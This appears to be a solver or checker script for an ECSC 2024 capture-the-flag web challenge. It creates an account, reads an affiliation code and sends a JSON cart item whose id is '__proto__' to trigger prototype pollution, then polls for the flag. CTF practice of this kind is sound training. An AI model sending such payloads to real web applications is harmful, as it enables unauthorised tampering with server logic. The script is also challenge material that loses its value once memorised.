#!/usr/bin/env python3

import logging
import os
import re
import time

import requests

logging.disable()

# For HTTP connection
URL = os.environ.get("URL", "http://affiliatedstore.challs.external.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

session = requests.Session()

# create account
session.post(f'{URL}/api/signup', json={
    'username': 'checker'
})

# get affiliation id
res = session.get(f'{URL}/')
affiliation = res.text.split('affiliation code: ')[1].split('<')[0].strip()

# attack
res = session.post(f'{URL}/api/feedback', json={
    'pow': 'redacted',
    'cart': [{
        'id': '__proto__',
        'affiliation': affiliation
    }]
})

while True:
    res = session.get(f'{URL}/dashboard')
    res.raise_for_status()

    m = re.findall(r'flag{.*}', res.text)
    if m:
        print(m[0])
        break

    time.sleep(1)
